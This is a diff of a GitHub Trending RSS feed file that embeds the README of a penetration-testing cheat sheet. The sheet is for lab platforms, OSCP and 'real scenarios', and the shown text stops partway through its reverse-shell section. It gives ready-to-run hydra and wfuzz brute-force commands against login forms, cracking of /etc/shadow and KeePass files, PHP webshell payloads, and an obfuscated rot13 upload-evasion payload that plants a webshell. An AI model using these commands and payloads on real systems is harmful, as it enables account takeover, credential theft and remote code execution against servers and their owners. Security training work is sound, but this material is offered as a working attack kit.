@@ -1,2 +1,596 @@
 <?xml version="1.0" encoding="utf-8"?>
-<rss version="2.0"><channel><title>GitHub Trending: XSLT, This week</title><link>https://github.com/trending/xslt?since=weekly</link><description>The top repositories on GitHub for xslt, measured weekly</description><pubDate>Mon, 27 Jan 2020 01:07:03 GMT</pubDate><lastBuildDate>Mon, 27 Jan 2020 01:07:03 GMT</lastBuildDate><generator>PyRSS2Gen-1.1.0</generator><docs>http://blogs.law.harvard.edu/tech/rss</docs><ttl>720</ttl><item><title>No repos in XSLT, This week for today</title><pubDate>Mon, 27 Jan 2020 01:07:03 GMT</pubDate></item></channel></rss>
+<rss version="2.0"><channel><title>GitHub Trending: XSLT, This week</title><link>https://github.com/trending/xslt?since=weekly</link><description>The top repositories on GitHub for xslt, measured weekly</description><pubDate>Tue, 28 Jan 2020 01:12:57 GMT</pubDate><lastBuildDate>Tue, 28 Jan 2020 01:12:57 GMT</lastBuildDate><generator>PyRSS2Gen-1.1.0</generator><docs>http://blogs.law.harvard.edu/tech/rss</docs><ttl>720</ttl><item><title>adon90/pentest_compilation #1 in XSLT, This week</title><link>https://github.com/adon90/pentest_compilation</link><description>&lt;p&gt;&lt;i&gt;Compilation of commands, tips and scripts that helped me throughout Vulnhub, Hackthebox, OSCP and real scenarios&lt;/i&gt;&lt;/p&gt;&lt;div id="readme" class="md" data-path="README.md"&gt;&lt;article class="markdown-body entry-content p-5" itemprop="text"&gt;&lt;p&gt;&lt;b&gt;Table of Contents&lt;/b&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="#enumeration"&gt;Enumeration&lt;/a&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="#genumeration"&gt;Generic Enumeration&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#httpenumeration"&gt;HTTP Enumeration&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#sshenumeration"&gt;SSH Enumeration&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#smbenumeration"&gt;SMB Enumeraion&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#snmpenumeration"&gt;SNMP Enumeration&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;a href="#explotation"&gt;Explotation&lt;/a&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="#bof"&gt;BOF Based Exploits&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#weakcreds"&gt;Weak Credentials&lt;/a&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="#httpbrute"&gt;HTTP Bruteforce&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#passcrack"&gt;Password Cracking&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;a href="#rce"&gt;RCE&lt;/a&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="#phprce"&gt;PHP RCE&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#rcewebshell"&gt;RCE via webshell&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#rcewmic"&gt;RCE WMIC (powershellless)&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#lolbins"&gt;LOLBins&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;a href="#privesc"&gt;Privilege Escalation&lt;/a&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="#linux"&gt;Linux&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#windows"&gt;Windows&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#kernel"&gt;Kernel Exploits&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;a href="#tunneling"&gt;Tunneling &amp;amp; Port Forwarding&lt;/a&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="#sshovertcp"&gt;SSH over TCP&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#tcpoverhttp"&gt;TCP over HTTP&lt;/a&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="#regeorg"&gt;1. reGeorg&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#abptts"&gt;2. ABPTTS&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;a href="#httpredirectors"&gt;HTTP Redirectors&lt;/a&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="#socatred"&gt;1. socat&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#iptablesred"&gt;2. iptables&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;a href="#windowsocks"&gt;Windows Socks Proxy&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#poor"&gt;Man's poor VPN&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;a href="#windowsad"&gt;Windows Active Directory&lt;/a&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="#applocker"&gt;Bypass Applocker&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#pth"&gt;Pass The Hash&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#krb"&gt;Kerberos&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#miscwin"&gt;Miscellaneous&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;a href="#revshells"&gt;Reverse Shells&lt;/a&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="#dns"&gt;DNS with dnscat2&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#icmp"&gt;ICMP&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#httpproxy"&gt;HTTP through proxy&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;a href="#misc"&gt;Miscellaneous&lt;/a&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="#interactiveshell"&gt;Interactive Reverse Shell&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#jailescape"&gt;rbash Jail Escape&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#windowstransfer"&gt;Windows File Transfer&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#vpnrestrict"&gt;Bypass VPN routing restrictions&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#avbypass"&gt;AV Bypass&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;p&gt;&lt;a name="user-content-enumeration"&gt;&lt;/a&gt;&lt;/p&gt;&lt;h2&gt;&lt;a id="user-content--enumeration-" class="anchor" aria-hidden="true" href="#-enumeration-"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; Enumeration &lt;/h2&gt;&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a name="user-content-genumeration"&gt;&lt;/a&gt;&lt;/p&gt;&lt;h3&gt;&lt;a id="user-content-generic-enumeration" class="anchor" aria-hidden="true" href="#generic-enumeration"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Generic Enumeration&lt;/h3&gt;&lt;p&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;port fullscan&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;UDP scan&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;a name="user-content-httpenumeration"&gt;&lt;/a&gt;&lt;/p&gt;&lt;h3&gt;&lt;a id="user-content--http-enumeration" class="anchor" aria-hidden="true" href="#-http-enumeration"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; HTTP Enumeration&lt;/h3&gt;&lt;p&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;dirsearch big.txt -e sh,txt,htm,php,cgi,html,pl,bak,old&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;banner inspection&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;review source code&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;bruteforce with cewl-based dictionary&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;searchsploit look at versions properly&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;test all the paths with the exploits, mangle it&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;nmap --script vuln&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;nmap --script safe (ssl-cert, virtual hosts)&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;always incercept with Burp&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;nikto -h&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;LFI, RFI, SQL, RCE, XXE, SSRF injections&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;PUT method all directories&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Change POST body encoding with Burp&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Bruteforce parameter names&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;dirsearch with cookie once authenticated&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;download vulnerable application from exploit-db and examine it&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;a name="user-content-sshenumeration"&gt;&lt;/a&gt;&lt;/p&gt;&lt;h3&gt;&lt;a id="user-content-ssh-enumeration" class="anchor" aria-hidden="true" href="#ssh-enumeration"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;SSH Enumeration&lt;/h3&gt;&lt;p&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;shellshock&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;bruteforce&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;user_enum&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Debian OpenSSL Predictable PRNG&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;a name="user-content-smbenumeration"&gt;&lt;/a&gt;&lt;/p&gt;&lt;h3&gt;&lt;a id="user-content-smb-enumeration" class="anchor" aria-hidden="true" href="#smb-enumeration"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;SMB Enumeration&lt;/h3&gt;&lt;p&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;nmap --script vuln&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;nmap --script smb*&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;nmap --script smb-enum-shares,smb-ls&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;enum4linux&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;a name="user-content-snmpenumeration"&gt;&lt;/a&gt;&lt;/p&gt;&lt;h3&gt;&lt;a id="user-content--snmp-enumeration" class="anchor" aria-hidden="true" href="#-snmp-enumeration"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;a name="user-content-snmpenumeration"&gt; SNMP Enumeration&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;&lt;/p&gt;&lt;a name="user-content-snmpenumeration"&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;snmpcheck&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;snmpenum&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/a&gt;&lt;p&gt;&lt;a name="user-content-snmpenumeration"&gt;&lt;/a&gt;&lt;a name="user-content-explotation"&gt;&lt;/a&gt;&lt;/p&gt;&lt;h2&gt;&lt;a id="user-content--explotation-" class="anchor" aria-hidden="true" href="#-explotation-"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; Explotation &lt;/h2&gt;&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a name="user-content-bof"&gt;&lt;/a&gt;&lt;/p&gt;&lt;h3&gt;&lt;a id="user-content--bof-exploit-based-" class="anchor" aria-hidden="true" href="#-bof-exploit-based-"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; BOF exploit-based &lt;/h3&gt;&lt;p&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;change shellcode&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;make sure all badchars are removed&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;read the exploit properly in case this makes changes in the shellcode&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;capture traffic with wireshark making sure the entire shellcode is transmited&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;run the exploit several times&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;make sure the JMP ESP matches OS and language&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;a name="user-content-weakcreds"&gt;&lt;/a&gt;&lt;/p&gt;&lt;h3&gt;&lt;a id="user-content--weak-credentials-" class="anchor" aria-hidden="true" href="#-weak-credentials-"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; Weak Credentials &lt;/h3&gt;&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a name="user-content-httpbrute"&gt;&lt;/a&gt;&lt;b&gt; HTTP Brute Force &lt;/b&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;wfuzz POST&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;code&gt;wfuzz --hc 404 -c -z list,admin -z file,/root/Documents/SecLists/Passwords/korelogic-password.txt -d "user=FUZZ&amp;amp;password=FUZ2Z" http://192.168.30.161/admin/index.php&lt;/code&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;hydra POST&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;code&gt;hydra 192.168.30.161 -s 80 http-form-post "/admin/index.php:user=^USER^&amp;amp;password=^PASS^:Moved Temporarily" -l admin -P /root/Documents/SecLists/Passwords/korelogic-password.txt -t 20&lt;/code&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;wfuzz NTLM&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;code&gt;wfuzz -c --ntlm "admin:FUZZ" -z file,/root/Documents/SecLists/Passwords/darkc0de.txt --hc 401 https://&amp;lt;ip&amp;gt;/api&lt;/code&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;wfuzz Basic Auth through Proxy&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;code&gt;wfuzz -c --hc 404,400,401 -z file,/root/Documents/Audits/Activos/names.txt -z file,/root/Documents/Audits/Activos/names.txt --basic "FUZZ:FUZ2Z" -p 127.0.0.1:8080 https://&amp;lt;ip&amp;gt;/api/v1/&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a name="user-content-passcrack"&gt;&lt;/a&gt;&lt;b&gt; Password Cracking &lt;/b&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;zip&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;code&gt;fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt file.zip &lt;/code&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;/etc/shadow&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;unshadow passwd shadow &amp;gt; passwords
+john --wordlist=/usr/share/wordlists/rockyou.txt passwords
+&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;keepass&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;keepass2john /root/Desktop/NewDatabase.kdb &amp;gt; file
+john -incremental:alpha -format=keepass file
+&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;Bruteforce Salted&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;for j in $(cat cipher); do echo $j; for i in $(cat digestion); do /root/Documents/HTB/Hawk/bruteforce-salted-openssl/bruteforce-salted-openssl -t 10 -f /usr/share/wordlists/rockyou.txt -c $j -d $i ../miau.txt -1 2&amp;gt;&amp;amp;1 | grep "candidate" ; done ; done
+&lt;/pre&gt;
+&lt;pre&gt;openssl aes-256-cbc -d -in ../miau.txt -out result.txt -k friends&lt;/pre&gt;
+&lt;p&gt;&lt;a name="user-content-rce"&gt;&lt;/a&gt;&lt;/p&gt;&lt;h2&gt;&lt;a id="user-content--rce-" class="anchor" aria-hidden="true" href="#-rce-"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; RCE &lt;/h2&gt;&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a name="user-content-phprce"&gt;&lt;/a&gt;&lt;/p&gt;&lt;h3&gt;&lt;a id="user-content-php-rce" class="anchor" aria-hidden="true" href="#php-rce"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;PHP RCE&lt;/h3&gt;&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;test:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;&amp;lt;?php phpinfo(); ?&amp;gt;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;simple shell:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;&amp;lt;?php system($_GET["c"]); ?&amp;gt;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;&amp;lt;?php `$_GET["c"]`; ?&amp;gt;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;file upload:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;&amp;lt;?php file_put_contents('/var/www/html/uploads/test.php', '&amp;lt;?php system($_GET["c"]);?&amp;gt;'); ?&amp;gt;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;file upload evasion:  rot13 + urlencode&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;&amp;lt;?php $payload="%3C%3Fcuc%20flfgrz%28%24_TRG%5Bp%5D%29%3B%3F%3E"; file_put_contents('/var/www/html/uploads/test8.php', str_rot13(urldecode($payload))); ?&amp;gt;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a name="user-content-rcewebshell"&gt;&lt;/a&gt;&lt;/p&gt;&lt;h3&gt;&lt;a id="user-content-rce-via-webshell" class="anchor" aria-hidden="true" href="#rce-via-webshell"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;RCE via webshell&lt;/h3&gt;&lt;p&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;All pentest monkey reverse shells: &lt;a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" rel="nofollow"&gt;http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;msfvenom x86/linux/shell_reverse_tcp -f elf&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Metasploit &lt;code&gt;web_delivery&lt;/code&gt; module&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;which wget | nc  &lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
